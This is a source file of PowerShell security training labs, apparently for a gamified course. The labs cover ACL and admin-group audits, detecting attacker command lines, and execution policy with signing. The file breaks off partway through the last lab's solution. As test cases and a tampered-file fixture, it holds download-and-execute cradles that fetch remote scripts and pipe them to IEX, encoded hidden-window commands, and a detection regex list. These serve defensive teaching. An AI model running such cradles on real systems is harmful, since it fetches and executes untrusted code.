      { q: "Why send <code>-ContentType 'application/json'</code> with a JSON body?", options: ["It's faster", "So the server knows how to read the body", "It encrypts it", "PowerShell requires it for GET"], answer: 1, why: "Without it, a hashtable body is sent as a web form." },
      { q: "When is <code>-SkipCertificateCheck</code> OK in production?", options: ["When the API is slow", "Never: it removes the check that you're talking to the real server", "For internal APIs", "With a token"], answer: 1, why: "It makes man-in-the-middle attacks trivial." }
    ]
  });

  /* ================================================================== PS-129 Users & permissions */
  var RISKY_FOLDERS = ["C:\\Program Files\\Kestrel", "C:\\Program Files\\Kestrel\\Updater", "C:\\Program Files\\Kestrel\\Agent", "C:\\lab\\shares\\finance", "C:\\lab\\shares\\public", "C:\\lab\\scripts"];
  function findingKeys(v) { return asList(v).map(function (o) { return (o.Path === undefined ? "" : str(o.Path)).toLowerCase().replace(/\\$/, "") + "|" + str(o.Identity).toLowerCase(); }).sort(); }
  LABS.push({
    id: "ps-129", n: 29, module: 4, ticket: "PS-129", xp: 100,
    title: "Who can write where?",
    topic: "Users & permissions: Get-Acl, local admins",
    from: DANA,
    story: "<p>Last night's attacker ran their miner as a service. One way to get a service like that is to <b>replace a service's program file</b>: if ordinary users can write to the folder a SYSTEM service runs from, any user can become SYSTEM.</p>" +
      "<p>Check the folders that matter, fix what's wrong, and clean up the Administrators group while we're at it. You're in an <b>elevated</b> session for this one.</p>",
    learn:
      "<h3>ACLs: who can do what</h3><p>Every file and folder has an <b>access control list</b>: an owner and a list of rules. Each rule says an identity (<code>BUILTIN\\Users</code>, <code>Everyone</code>, a user...) is <b>Allowed</b> or <b>Denied</b> some rights (<code>ReadAndExecute</code>, <code>Write</code>, <code>Modify</code>, <code>FullControl</code>).</p>" +
      ex("$acl = Get-Acl 'C:\\Program Files\\Kestrel\\Updater'\n$acl.Owner\n$acl.Access | Format-Table IdentityReference, AccessControlType, FileSystemRights, IsInherited") +
      "<p><b>Inherited</b> rules come from the parent folder; the others were set on this folder directly. The risky pattern: a broad group (<code>Everyone</code>, <code>BUILTIN\\Users</code>, <code>NT AUTHORITY\\Authenticated Users</code>) with <code>Write</code>, <code>Modify</code> or <code>FullControl</code> where programs run or sensitive data lives.</p>" +
      "<h3>Changing an ACL</h3><p>Get the ACL object, change it, write it back with <code>Set-Acl</code>:</p>" +
      '<pre class="code">$acl = Get-Acl $folder\n$bad = $acl.Access | Where-Object { $_.IdentityReference -eq \'BUILTIN\\Users\' -and -not $_.IsInherited }\n$acl.RemoveAccessRule($bad) | Out-Null\nSet-Acl -Path $folder -AclObject $acl</pre>' +
      "<p>To add a rule: <code>$rule = New-Object System.Security.AccessControl.FileSystemAccessRule('KESTREL\\svc-backup', 'ReadAndExecute', 'Allow')</code>, then <code>$acl.AddAccessRule($rule)</code>. Inherited rules can't be removed one by one: you'd first break inheritance with <code>$acl.SetAccessRuleProtection($true, $true)</code>.</p>" +
      "<h3>Local Administrators</h3><p>Members of <code>Administrators</code> can do anything on the machine. Compare the group with an <b>approved list</b> regularly:</p>" +
      ex("Get-LocalGroupMember -Group Administrators | Select-Object Name, ObjectClass") +
      "<p><code>Remove-LocalGroupMember -Group Administrators -Member temp.admin</code> removes one (needs an elevated session). Member names come back as <code>KC-WIN-01\\name</code>.</p>",
    files: { "config/approved-admins.txt": lines("Administrator", "dana.park", "svc-backup") },
    prelude: "Initialize-LabScenario permissions, admin",
    starter: ps`
      # PS-129 · Who can write where?   (elevated session)
      $risky = 'Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'

      # 1) $updaterRisky: the rules on 'C:\Program Files\Kestrel\Updater' that give a $risky identity Write, Modify or FullControl


      # 2) Find-WritableFolder -Path <folders>: for each folder, one object per risky rule, with Path (the folder),
      #    Identity and Rights
      function Find-WritableFolder {

      }

      # 3) Remove the risky rule from C:\Program Files\Kestrel\Updater (keep the others)


      # 4) $extraAdmins: members of Administrators who aren't in config\approved-admins.txt (just the names, sorted).
      #    Then remove them from the group.
    `,
    objectives: [
      {
        id: "spot", text: "<code>$updaterRisky</code> holds the one dangerous rule on the Updater folder: <code>BUILTIN\\Users</code> with <code>Modify</code>.",
        hints: ["(Get-Acl $path).Access | Where-Object { $_.IdentityReference -in $risky -and $_.FileSystemRights -match 'Write|Modify|FullControl' }"],
        check: function (r) {
          var v = asList(r.v("updaterRisky"));
          if (!v.length) return "$updaterRisky is empty. Look at (Get-Acl 'C:\\Program Files\\Kestrel\\Updater').Access.";
          var ids = v.map(function (x) { return x.get ? str(x.get("IdentityReference")) + " " + str(x.get("FileSystemRights")) : "?"; });
          return same(ids, ["BUILTIN\\Users Modify, Synchronize"]) ? true : "$updaterRisky should be just the BUILTIN\\Users Modify rule (not the read-only Users rule). Yours: " + H.show(ids) + ".";
        }
      },
      {
        id: "audit", text: "<code>Find-WritableFolder</code> finds the 3 risky folders: Updater (Users), finance (Everyone) and scripts (Authenticated Users).",
        hints: ["foreach ($folder in $Path) { foreach ($rule in (Get-Acl $folder).Access) { if (...) { [PSCustomObject]@{ Path = $folder; Identity = ...; Rights = ... } } } }",
          "function Find-WritableFolder {\n    param([string[]]$Path)\n    foreach ($folder in $Path) {\n        foreach ($rule in (Get-Acl $folder).Access) {\n            if ($rule.IdentityReference -in $risky -and $rule.AccessControlType -eq 'Allow' -and $rule.FileSystemRights -match 'Write|Modify|FullControl') {\n                [PSCustomObject]@{ Path = $folder; Identity = $rule.IdentityReference.Value; Rights = $rule.FileSystemRights }\n            }\n        }\n    }\n}"],
        check: function (r) {
          if (!r.fn("Find-WritableFolder")) return "I can't find a function called Find-WritableFolder.";
          // Run it against the original permissions (before your fix in task 3).
          var saved = JSON.parse(JSON.stringify(r.system.acls || {}));
          lib.permissionsScenario(r.system);
          var res = r.ps("Find-WritableFolder -Path " + RISKY_FOLDERS.map(function (f) { return "'" + f + "'"; }).join(", "));
          r.system.acls = saved;
          if (!res.ok) return "Find-WritableFolder failed: " + res.errors[0];
          var want = ["c:\\lab\\scripts|nt authority\\authenticated users", "c:\\lab\\shares\\finance|everyone", "c:\\program files\\kestrel\\updater|builtin\\users"];
          var got = findingKeys(res.value);
          return same(got, want) ? true : "On the original folders, Find-WritableFolder should report " + H.show(want) + " (Path|Identity). It reported " + H.show(got) + ". (Read-only rules don't count.)";
        }
      },
      {
        id: "fix", text: "The Updater folder no longer lets <code>BUILTIN\\Users</code> modify it, and its other rules are intact.",
        hints: ["$acl = Get-Acl $p; $acl.RemoveAccessRule(<the rule>) | Out-Null; Set-Acl -Path $p -AclObject $acl"],
        check: function (r) {
          var a = lib.effectiveAcl(r.system, "C:\\Program Files\\Kestrel\\Updater");
          var rules = a.rules.map(function (x) { return x.id + " " + x.rights; });
          if (rules.some(function (x) { return /Users Modify/.test(x); })) return "BUILTIN\\Users can still modify the Updater folder. Remove that rule and Set-Acl.";
          if (!rules.some(function (x) { return /^NT AUTHORITY\\SYSTEM FullControl/.test(x); }) || !rules.some(function (x) { return /^BUILTIN\\Users ReadAndExecute/.test(x); })) return "Only the risky rule should go: SYSTEM, Administrators and the read-only Users rule must stay.";
          return true;
        }
      },
      {
        id: "admins", text: "<code>$extraAdmins</code> is <code>gus.hall</code> and <code>temp.admin</code>, and they're no longer in Administrators.",
        hints: ["$approved = Get-Content .\\config\\approved-admins.txt; $members = (Get-LocalGroupMember Administrators).Name | ForEach-Object { $_.Split('\\')[-1] }",
          "$approved = Get-Content .\\config\\approved-admins.txt\n$members = (Get-LocalGroupMember -Group Administrators).Name | ForEach-Object { $_.Split('\\')[-1] }\n$extraAdmins = $members | Where-Object { $_ -notin $approved } | Sort-Object\nforeach ($m in $extraAdmins) { Remove-LocalGroupMember -Group Administrators -Member $m }"],
        check: function (r) {
          var v = asList(r.v("extraAdmins")).map(str);
          if (!same(v, ["gus.hall", "temp.admin"])) return "$extraAdmins should be gus.hall and temp.admin (names only, sorted). Yours: " + H.show(v) + ".";
          var g = r.system.groups.Administrators.slice().sort();
          if (!same(g, ["Administrator", "dana.park", "svc-backup"])) return "Administrators should now be exactly Administrator, dana.park and svc-backup. It is: " + g.join(", ");
          var r2 = r.run(r.src, { system: function (sys) { sys.groups.Administrators.push("chris.lee"); } });
          return same(asList(r2.v("extraAdmins")).map(str), ["chris.lee", "gus.hall", "temp.admin"]) ? true : "When chris.lee was also in Administrators, $extraAdmins didn't include him. Compare with the approved list instead of naming people.";
        }
      }
    ],
    solution: ps`
      $risky = 'Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'
      $updater = 'C:\Program Files\Kestrel\Updater'

      $updaterRisky = (Get-Acl $updater).Access | Where-Object {
          $_.IdentityReference -in $risky -and $_.AccessControlType -eq 'Allow' -and $_.FileSystemRights -match 'Write|Modify|FullControl'
      }

      function Find-WritableFolder {
          param([string[]]$Path)
          foreach ($folder in $Path) {
              foreach ($rule in (Get-Acl $folder).Access) {
                  if ($rule.IdentityReference -in $risky -and $rule.AccessControlType -eq 'Allow' -and $rule.FileSystemRights -match 'Write|Modify|FullControl') {
                      [PSCustomObject]@{ Path = $folder; Identity = $rule.IdentityReference.Value; Rights = $rule.FileSystemRights }
                  }
              }
          }
      }

      $acl = Get-Acl $updater
      foreach ($rule in $updaterRisky) { $acl.RemoveAccessRule($rule) | Out-Null }
      Set-Acl -Path $updater -AclObject $acl

      $approved = Get-Content .\config\approved-admins.txt
      $members = (Get-LocalGroupMember -Group Administrators).Name | ForEach-Object { $_.Split('\')[-1] }
      $extraAdmins = $members | Where-Object { $_ -notin $approved } | Sort-Object
      foreach ($m in $extraAdmins) { Remove-LocalGroupMember -Group Administrators -Member $m }
    `,
    debrief: "<p>Ticket closed. Regular users can no longer swap the updater's program for their own, the finance share and scripts folder are on your list for their owners, and two unexpected admins are gone. Least privilege, applied one folder and one group at a time.</p>",
    realworld: "On your PC: (Get-Acl $env:ProgramFiles).Access | Format-Table and Get-LocalGroupMember Administrators. The classic command-line tool is icacls: icacls \"C:\\Program Files\\Kestrel\" shows the same rules.",
    quiz: [
      { q: "Why is <code>BUILTIN\\Users</code> with Modify on a service's program folder dangerous?", options: ["It isn't", "Any user can replace the program, and the service runs it as SYSTEM", "It slows the service", "Users can read logs"], answer: 1, why: "It's a classic local privilege escalation." },
      { q: "A rule shows <code>IsInherited: True</code>. Where does it come from?", options: ["A parent folder", "The registry", "Group Policy only", "The file's owner"], answer: 0, why: "Change it on the parent, or break inheritance first." },
      { q: "What does Set-Acl do?", options: ["Reads permissions", "Writes the changed ACL object back to the file or folder", "Takes ownership", "Encrypts the folder"], answer: 1, why: "Get-Acl, change the object, Set-Acl." }
    ]
  });

  /* ================================================================== PS-130 Attacker PowerShell */
  var SUS_CASES = [
    ["pwsh -NoProfile -File C:\\lab\\scripts\\Get-DiskReport.ps1", []],
    ["powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA", ["EncodedCommand", "HiddenWindow"]],
    ["powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a.ps1')\"", ["DownloadCradle", "InvokeExpression"]],
    ["powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\run.ps1", ["PolicyBypass"]],
    ["powershell -Version 2 -Command Get-Process", ["Downgrade"]],
    ["pwsh -WindowStyle hidden -EncodedCommand ZQBjAGgAbwAgAGgAaQA=", ["EncodedCommand", "HiddenWindow"]],
    ["pwsh -ep bypass -e ZQBjAGgAbwA=", ["EncodedCommand", "PolicyBypass"]],
    ["powershell iwr http://203.0.113.9/p.ps1 | iex", ["DownloadCradle", "InvokeExpression"]],
    ["pwsh -Command Get-Service | Export-Csv C:\\reports\\services.csv", []],
    ["notepad.exe C:\\temp\\encoder-notes.txt", []],
    ["POWERSHELL -EXEC BYPASS -ENC SQBFAFgA", ["EncodedCommand", "PolicyBypass"]]
  ];
  var SBL = "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging";
  LABS.push({
    id: "ps-130", n: 30, module: 4, ticket: "PS-130", xp: 100,
    title: "Think like the attacker",
    topic: "Attacker PowerShell: -EncodedCommand, logging, AMSI",
    from: DEV,
    story: "<p>PowerShell is on every Windows machine, so attackers love it. Last night's intruder used it too. Let's learn their tricks well enough to <b>spot</b> them, then make sure the next attempt leaves a trail and has fewer options.</p>",
    learn:
      "<h3>The tricks</h3>" +
      '<table class="t"><tr><th>Trick</th><th>Looks like</th><th>Why</th></tr>' +
      "<tr><td>Encoded commands</td><td><code>-EncodedCommand SQBFAFgA...</code> (also <code>-enc</code>, <code>-e</code>)</td><td>Base64 of UTF-16 text hides the real command from a quick look</td></tr>" +
      "<tr><td>Hidden window</td><td><code>-WindowStyle Hidden</code>, <code>-w hidden</code></td><td>The user doesn't see a console flash</td></tr>" +
      "<tr><td>Download cradle</td><td><code>(New-Object Net.WebClient).DownloadString(url)</code>, <code>iwr url</code></td><td>Fetches the next stage from the internet</td></tr>" +
      "<tr><td>Invoke-Expression</td><td><code>IEX (...)</code></td><td>Runs downloaded text as code, never touching disk</td></tr>" +
      "<tr><td>Policy bypass</td><td><code>-ExecutionPolicy Bypass</code>, <code>-ep bypass</code></td><td>Execution policy isn't a security boundary (next lab)</td></tr>" +
      "<tr><td>Downgrade</td><td><code>powershell -Version 2</code></td><td>The old 2.0 engine has no logging and no AMSI</td></tr></table>" +
      ex("$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Get-Date'))\n$b64\n[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))") +
      "<h3>The defender's view</h3><ul><li><b>Script block logging</b> (event 4104 in <code>Microsoft-Windows-PowerShell/Operational</code>) records the code PowerShell actually ran, <b>after</b> decoding. Windows logs suspicious blocks automatically; turn on the policy to log everything: <code>" + SBL + "</code>, value <code>EnableScriptBlockLogging = 1</code>.</li>" +
      "<li><b>AMSI</b> lets your antivirus inspect script content just before it runs, even when it was downloaded or decoded in memory. Known-bad content fails with <i>This script contains malicious content and has been blocked by your antivirus software</i>.</li>" +
      "<li><b>Remove PowerShell 2.0</b>: <code>Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root</code>, so nobody can downgrade.</li></ul>" +
      ex("Get-WinEvent -FilterHashtable @{ LogName = 'Microsoft-Windows-PowerShell/Operational'; Id = 4104 } | Select-Object TimeCreated, @{ n = 'Code'; e = { $_.Properties[2].Value } }"),
    prelude: "Initialize-LabScenario incident, admin",
    starter: ps`
      # PS-130 · Think like the attacker   (elevated session)

      # 1) $decoded: the decoded -EncodedCommand of the powershell process with Id 7012; $payloadUrl: the URL inside it


      # 2) Test-SuspiciousCommand -CommandLine <text>: return the matching reasons, in this order:
      #    EncodedCommand, HiddenWindow, DownloadCradle, InvokeExpression, PolicyBypass, Downgrade   (nothing for a clean command)
      function Test-SuspiciousCommand {

      }

      # 3) Turn on script block logging (EnableScriptBlockLogging = 1 under the policy key), then prove it: run
      #    pwsh -NoProfile -EncodedCommand <Get-Service W3SVC, encoded> and set $logged to the newest 4104 event's code


      # 4) Remove PowerShell 2.0 (MicrosoftWindowsPowerShellV2Root); set $v2State to the feature's State afterwards
    `,
    objectives: [
      {
        id: "decode", text: "<code>$decoded</code> is the hidden command of process 7012, and <code>$payloadUrl</code> is <code>http://198.51.100.66/a.ps1</code>.",
        hints: ["$cmd = (Get-CimInstance Win32_Process -Filter 'ProcessId = 7012').CommandLine; the Base64 is the last word.",
          "$cmd = (Get-CimInstance Win32_Process -Filter 'ProcessId = 7012').CommandLine\n$b64 = ($cmd -split '\\s+')[-1]\n$decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))\nif ($decoded -match \"'(http[^']+)'\") { $payloadUrl = $Matches[1] }"],
        check: function (r) {
          if (str(r.v("decoded")) !== "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a.ps1')") return "$decoded should be the decoded text (UTF-16: [Text.Encoding]::Unicode). It's " + H.show(r.v("decoded")) + ".";
          return str(r.v("payloadUrl")) === "http://198.51.100.66/a.ps1" ? true : "$payloadUrl should be http://198.51.100.66/a.ps1 (use -match on $decoded).";
        }
      },
      {
        id: "detect", text: "<code>Test-SuspiciousCommand</code> flags the right reasons for 11 command lines, including abbreviations like <code>-ep bypass</code> and <code>-e</code>, without false alarms.",
        hints: ["Make a list of name/pattern pairs and return the names whose regex matches (-match ignores case).",
          "function Test-SuspiciousCommand {\n    param([string]$CommandLine)\n    $rules = @(\n        @('EncodedCommand', '\\s-e(nc\\w*|c)?\\s'),\n        @('HiddenWindow', '\\s-w\\w*\\s+h'),\n        @('DownloadCradle', 'DownloadString|DownloadFile|Net\\.WebClient|Invoke-WebRequest|\\biwr\\b'),\n        @('InvokeExpression', '\\biex\\b|Invoke-Expression'),\n        @('PolicyBypass', '\\s-(ep|ex\\w*)\\s+(bypass|unrestricted)'),\n        @('Downgrade', '\\s-v(ersion)?\\s+2\\b')\n    )\n    foreach ($rule in $rules) { if ($CommandLine -match $rule[1]) { $rule[0] } }\n}"],
        check: function (r) {
          if (!r.fn("Test-SuspiciousCommand")) return "I can't find a function called Test-SuspiciousCommand.";
          for (var i = 0; i < SUS_CASES.length; i++) {
            var c = SUS_CASES[i];
            var res = r.ps("@(Test-SuspiciousCommand -CommandLine '" + c[0].replace(/'/g, "''") + "')");
            if (!res.ok) return "Test-SuspiciousCommand failed: " + res.errors[0];
            var got = asList(res.value).map(str);
            if (!same(got, c[1])) return "For: " + c[0] + "\nexpected " + H.show(c[1]) + ", got " + H.show(got) + ".";
          }
          return true;
        }
      },
      {
        id: "logging", text: "Script block logging is on, and <code>$logged</code> is the decoded text of your encoded test command: <code>Get-Service W3SVC</code>.",
        hints: ["New-Item -Path '" + SBL + "' -Force; New-ItemProperty -Path ... -Name EnableScriptBlockLogging -Value 1 -PropertyType DWord",
          "New-Item -Path '" + SBL + "' -Force | Out-Null\nNew-ItemProperty -Path '" + SBL + "' -Name EnableScriptBlockLogging -Value 1 -PropertyType DWord | Out-Null\n$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Get-Service W3SVC'))\npwsh -NoProfile -EncodedCommand $enc | Out-Null\n$logged = (Get-WinEvent -FilterHashtable @{ LogName = 'Microsoft-Windows-PowerShell/Operational'; Id = 4104 } -MaxEvents 1).Properties[2].Value"],
        check: function (r) {
          var k = lib.reg.find(r.system, SBL);
          var on = k && k.values.some(function (v) { return /^enablescriptblocklogging$/i.test(v.name) && E.toNumber(v.value) === 1; });
          if (!on) return "Set EnableScriptBlockLogging = 1 under " + SBL + ".";
          return str(r.v("logged")) === "Get-Service W3SVC" ? true : "$logged should be the code from the newest 4104 event: Get-Service W3SVC (run it with pwsh -EncodedCommand first). It's " + H.show(r.v("logged")) + ".";
        }
      },
      {
        id: "v2", text: "PowerShell 2.0 is removed and <code>$v2State</code> is <code>Disabled</code>.",
        hints: ["Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -NoRestart", "Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -NoRestart | Out-Null\n$v2State = (Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root).State"],
        check: function (r) {
          if (r.system.features.MicrosoftWindowsPowerShellV2Root !== "Disabled") return "The MicrosoftWindowsPowerShellV2Root feature is still Enabled.";
          return str(r.v("v2State")) === "Disabled" ? true : "$v2State should be Disabled (read it back with Get-WindowsOptionalFeature).";
        }
      }
    ],
    solution: ps`
      $cmd = (Get-CimInstance Win32_Process -Filter 'ProcessId = 7012').CommandLine
      $b64 = ($cmd -split '\s+')[-1]
      $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))
      if ($decoded -match "'(http[^']+)'") { $payloadUrl = $Matches[1] }

      function Test-SuspiciousCommand {
          param([string]$CommandLine)
          $rules = @(
              @('EncodedCommand', '\s-e(nc\w*|c)?\s'),
              @('HiddenWindow', '\s-w\w*\s+h'),
              @('DownloadCradle', 'DownloadString|DownloadFile|Net\.WebClient|Invoke-WebRequest|\biwr\b'),
              @('InvokeExpression', '\biex\b|Invoke-Expression'),
              @('PolicyBypass', '\s-(ep|ex\w*)\s+(bypass|unrestricted)'),
              @('Downgrade', '\s-v(ersion)?\s+2\b')
          )
          foreach ($rule in $rules) { if ($CommandLine -match $rule[1]) { $rule[0] } }
      }

      $key = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
      New-Item -Path $key -Force | Out-Null
      New-ItemProperty -Path $key -Name EnableScriptBlockLogging -Value 1 -PropertyType DWord | Out-Null
      $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Get-Service W3SVC'))
      pwsh -NoProfile -EncodedCommand $enc | Out-Null
      $logged = (Get-WinEvent -FilterHashtable @{ LogName = 'Microsoft-Windows-PowerShell/Operational'; Id = 4104 } -MaxEvents 1).Properties[2].Value

      Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -NoRestart | Out-Null
      $v2State = (Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root).State
    `,
    debrief: "<p>Ticket closed. You can read an encoded command, a detector flags the usual tricks, every script block is now logged in clear text, and the 2.0 downgrade door is shut. Real detection rules (Sigma, your EDR) are this function's grown-up cousins.</p>",
    realworld: "On a test VM: turn on script block logging in gpedit.msc (Administrative Templates > Windows Components > Windows PowerShell), run an encoded command, then look in Event Viewer under Applications and Services Logs > Microsoft > Windows > PowerShell > Operational.",
    quiz: [
      { q: "What encoding does <code>-EncodedCommand</code> expect before Base64?", options: ["UTF-8", "UTF-16LE (Unicode)", "ASCII", "None"], answer: 1, why: "That's why decoding with UTF8 gives text full of gaps." },
      { q: "Why does script block logging defeat encoding tricks?", options: ["It blocks Base64", "It logs the code after PowerShell decoded it", "It deletes encoded commands", "It doesn't"], answer: 1, why: "Event 4104 shows what actually ran." },
      { q: "Why do attackers try <code>powershell -Version 2</code>?", options: ["It's faster", "The 2.0 engine has no AMSI and no script block logging", "It runs as admin", "It's the only one with IEX"], answer: 1, why: "Remove the feature to close that door." }
    ]
  });

  /* ================================================================== PS-131 Execution policy & signing */
  var PATCH = "'All 3 updates installed'\n", CLEAN = "Remove-Item $env:TEMP\\* -Recurse -Force\n'Temp files cleared'\n";
  var CLEAN_BAD = CLEAN + "iwr http://203.0.113.9/x.ps1 -OutFile $env:TEMP\\x.ps1\n";
  var POLICY_FILES = {
    "downloads/Get-PatchStatus.ps1": { content: PATCH, zone: 3, from: "https://tools.example.com/Get-PatchStatus.ps1" },
    "downloads/Get-PatchStatus.ps1.sha256": sha(PATCH).toUpperCase() + "  Get-PatchStatus.ps1\n",
    "downloads/Clear-TempFiles.ps1": { content: CLEAN_BAD, zone: 3, from: "https://mirror.example.net/Clear-TempFiles.ps1" },
    "downloads/Clear-TempFiles.ps1.sha256": sha(CLEAN).toUpperCase() + "  Clear-TempFiles.ps1\n",
    "scripts/Backup-Config.ps1": "Copy-Item .\\config\\*.json .\\backup -ErrorAction SilentlyContinue\n'Config backed up'\n",
    "scripts/helpers.ps1": "function Format-Size { param([double]$Bytes) '{0:N1} KB' -f ($Bytes / 1KB) }\n"
  };
  LABS.push({
    id: "ps-131", n: 31, module: 4, ticket: "PS-131", xp: 100,
    title: "Who's allowed to run this?",
    topic: "Execution policy, Mark of the Web & signing",
    from: DANA,
    story: "<p>Someone downloaded two scripts from vendor sites and PowerShell refuses to run them. Before anyone types <code>-ExecutionPolicy Bypass</code>, let's understand why it refuses, unblock only what we can verify, and start <b>signing</b> our own scripts.</p>",
    learn:
      "<h3>Execution policy</h3><p>A setting that decides which <b>script files</b> PowerShell runs:</p>" +
      '<table class="t"><tr><th>Policy</th><th>Runs</th></tr><tr><td><code>Restricted</code></td><td>no scripts (the old Windows client default)</td></tr><tr><td><code>RemoteSigned</code></td><td>local scripts; downloaded ones only if signed (default on servers and in PowerShell 7)</td></tr>' +
      "<tr><td><code>AllSigned</code></td><td>only scripts signed by a trusted publisher</td></tr><tr><td><code>Unrestricted</code></td><td>everything, with a warning for downloads</td></tr><tr><td><code>Bypass</code></td><td>everything, silently</td></tr></table>" +
      "<p>It's set per <b>scope</b>; the most specific one wins: MachinePolicy and UserPolicy (Group Policy) &gt; Process (this window) &gt; CurrentUser &gt; LocalMachine.</p>" + ex("Get-ExecutionPolicy -List\nGet-ExecutionPolicy") +
      "<h3>Mark of the Web</h3><p>Browsers tag downloads with a hidden <code>Zone.Identifier</code> stream (ZoneId 3 = internet). That's what makes <code>RemoteSigned</code> treat a file as \"remote\".</p>" +
      ex("Get-Content .\\downloads\\Get-PatchStatus.ps1 -Stream Zone.Identifier") +
      "<p><code>Unblock-File</code> removes the mark. Only do it after you've checked the file, e.g. its hash against the vendor's (PS-127).</p>" +
      "<h3>Signing</h3><p>A signature proves <b>who</b> published a script and that it hasn't changed since. Sign with a code-signing certificate; any later change makes the signature invalid (<code>HashMismatch</code>).</p>" +
      '<pre class="code">$cert = Get-ChildItem Cert:\\CurrentUser\\My -CodeSigningCert\nSet-AuthenticodeSignature -FilePath .\\script.ps1 -Certificate $cert\nGet-AuthenticodeSignature .\\script.ps1</pre>' +
      '<div class="callout warn"><b>Not a security boundary.</b> Microsoft says it plainly: execution policy stops <i>accidents</i>. Anyone can run <code>pwsh -ExecutionPolicy Bypass -File x.ps1</code>, or paste the code into the console. Real control comes from AppLocker / WDAC application control, which do enforce signing.</div>',
    files: POLICY_FILES,
    starter: ps`
      # PS-131 · Who's allowed to run this?

      # 1) $effective: the execution policy in effect; $machine: the LocalMachine scope's policy


      # 2) For each downloads\*.ps1, compare its SHA256 with the hash in the matching .sha256 file and Unblock-File only
      #    the ones that match. Then run the patch status script and keep its output in $patchStatus


      # 3) Sign scripts\Backup-Config.ps1 with the code-signing certificate in Cert:\CurrentUser\My


      # 4) Require signatures for your account (AllSigned, CurrentUser scope), then run Backup-Config.ps1 into $backup
    `,
    objectives: [
      {
        id: "policy", text: "<code>$effective</code> and <code>$machine</code> hold the effective and LocalMachine policies (both <code>RemoteSigned</code> here).",
        hints: ["Get-ExecutionPolicy, and Get-ExecutionPolicy -Scope LocalMachine"],
        check: function (r) {
          if (str(r.v("effective")) !== "RemoteSigned" || str(r.v("machine")) !== "RemoteSigned") return "$effective and $machine should both be RemoteSigned here. They are " + H.show(r.v("effective")) + " and " + H.show(r.v("machine")) + ".";
          var r2 = r.run(r.src, { system: function (sys) { sys.policy.UserPolicy = "AllSigned"; } });
          return str(r2.v("effective")) === "AllSigned" && str(r2.v("machine")) === "RemoteSigned" ? true : "When Group Policy set AllSigned for users, $effective should follow (Get-ExecutionPolicy), and $machine stay RemoteSigned.";
        }
      },
      {
        id: "unblock", text: "Only <code>Get-PatchStatus.ps1</code> (whose hash matches) is unblocked, and <code>$patchStatus</code> is its output.",
        hints: ["foreach ($f in Get-ChildItem .\\downloads -Filter *.ps1) { $expected = (Get-Content \"$($f.FullName).sha256\").Split(' ')[0]; ... }",
          "foreach ($f in Get-ChildItem .\\downloads -Filter *.ps1) {\n    $expected = ((Get-Content \"$($f.FullName).sha256\") -split '\\s+')[0]\n    if ((Get-FileHash $f.FullName).Hash -eq $expected) { Unblock-File $f.FullName }\n}\n$patchStatus = .\\downloads\\Get-PatchStatus.ps1"],
        check: function (r) {
          var a = r.system.files["downloads\\get-patchstatus.ps1"], b = r.system.files["downloads\\clear-tempfiles.ps1"];
          if (a.zone) return "Get-PatchStatus.ps1 still has its Zone.Identifier. Its hash matches: unblock it.";
          if (!b.zone) return "Clear-TempFiles.ps1 was unblocked, but its hash doesn't match the published one: it's been tampered with. Leave it blocked.";
          if (str(r.v("patchStatus")) !== "All 3 updates installed") return "$patchStatus should hold the output of .\\downloads\\Get-PatchStatus.ps1.";
          var r2 = r.run(r.src, { files: { "downloads/Get-PatchStatus.ps1": { content: PATCH + "'extra'\n", zone: 3 }, "downloads/Clear-TempFiles.ps1": { content: CLEAN, zone: 3 } } });
          return r2.system.files["downloads\\get-patchstatus.ps1"].zone && !r2.system.files["downloads\\clear-tempfiles.ps1"].zone ? true : "When I made Get-PatchStatus.ps1 the tampered one, your code still unblocked it. Decide by hash, not by name.";
        }
      },
      {
        id: "sign", text: "<code>scripts\\Backup-Config.ps1</code> has a valid signature from the Kestrel code-signing certificate.",
        hints: ["$cert = Get-ChildItem Cert:\\CurrentUser\\My -CodeSigningCert", "$cert = Get-ChildItem Cert:\\CurrentUser\\My -CodeSigningCert\nSet-AuthenticodeSignature -FilePath .\\scripts\\Backup-Config.ps1 -Certificate $cert | Out-Null"],
        check: function (r) {
          var res = r.ps("(Get-AuthenticodeSignature .\\scripts\\Backup-Config.ps1).Status");
          return str(res.value) === "Valid" ? true : "Get-AuthenticodeSignature should say Valid for Backup-Config.ps1. It says " + H.show(res.value) + ".";
        }
      },
      {
        id: "allsigned", text: "Your account's policy is <code>AllSigned</code>, and the signed <code>Backup-Config.ps1</code> still runs: <code>$backup</code> is <code>Config backed up</code>.",
        hints: ["Set-ExecutionPolicy AllSigned -Scope CurrentUser", "Set-ExecutionPolicy AllSigned -Scope CurrentUser -Force\n$backup = .\\scripts\\Backup-Config.ps1"],
        check: function (r) {
          if (r.system.policy.CurrentUser !== "AllSigned") return "Set the CurrentUser scope to AllSigned.";
          if (str(r.v("backup")) !== "Config backed up") return "$backup should hold the output of the signed .\\scripts\\Backup-Config.ps1. It's " + H.show(r.v("backup")) + ".";
          var t = r.ps("try { .\\scripts\\helpers.ps1; 'ran' } catch { 'blocked' }");
          return str(t.value) === "blocked" ? true : "Under AllSigned, the unsigned helpers.ps1 should be refused.";
        }
      }
    ],
    solution: ps`
      $effective = Get-ExecutionPolicy
